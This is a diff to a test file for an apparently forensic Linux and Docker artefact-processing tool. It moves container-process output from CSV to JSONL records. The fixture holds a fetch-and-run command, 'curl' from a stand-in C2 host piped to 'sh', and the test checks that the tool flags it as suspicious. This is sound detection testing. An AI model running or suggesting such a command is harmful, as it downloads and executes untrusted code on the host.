@@ -11,6 +11,7 @@ from pathlib import Path
 REPO = Path(__file__).resolve().parents[2]
 sys.path.append(str(REPO / "src" / "analysis"))
 
+from rowanholt.core.records import own_fields, read_records  # noqa: E402
 from rowanholt.process import linux_artefacts as la  # noqa: E402
 
 CID = "4f1c9e2ab3d7" + "0" * 52
@@ -74,10 +75,9 @@ def test_python_collector_and_elrond(tmp_path, monkeypatch):
     for name in ("inspect.json", "top.txt"):
         (raw / name).write_bytes((host / "artefacts" / "live_containers" / "docker" / CID[:12] / name).read_bytes())
     assert la.process_linux_artefact("", "'HOST'", str(out) + "/", "HOST::Linux", "/", "processing", str(raw / "top.txt"))
-    # inspect.json is read too, for a docker_containers.csv row where the case has no config.v2.json
+    # inspect.json is read too, for a docker_containers row where the case has no config.v2.json
     assert la.is_linux_artefact(str(raw / "inspect.json"))
-    with open(out / "HOST" / "artefacts" / "cooked" / "container_processes.csv", newline="") as fh:
-        rows = list(csv.DictReader(fh))
+    rows = [r for _, r in read_records(out / "HOST" / "artefacts" / "cooked" / "container_processes.jsonl")]
     assert [(r["PID"], r["Name"], r["Image"], r["Flag"]) for r in rows] == [
         ("4242", "lab-miner", "alpine:3.20", "suspicious command"), ("4250", "lab-miner", "alpine:3.20", "")]
     assert rows[0]["Command"] == "sh -c curl -s http://c2.example/x | sh"
@@ -131,7 +131,7 @@ def test_live_inspect_is_a_container_row(tmp_path):
     """A Windows host's Docker Desktop keeps config.v2.json in its WSL VM: `docker inspect` from the live
     capture is the only record of what a container may reach (found on the lab's Windows VM, 5 November 2026)."""
     out, rows, _, techniques = la._route_live_inspect(live_inspect(tmp_path, privileged=True))
-    assert out == "docker_containers.csv" and techniques == ["T1611"]
+    assert out == "docker_containers" and techniques == ["T1611"]
     row = rows[0]
     assert (row["Container"], row["Name"], row["Runtime"], row["Privileged"]) == (CID[:12], "lab-priv", "docker (live)", "True")
     assert row["Flag"] == "privileged; host path mounted read-write (/)"
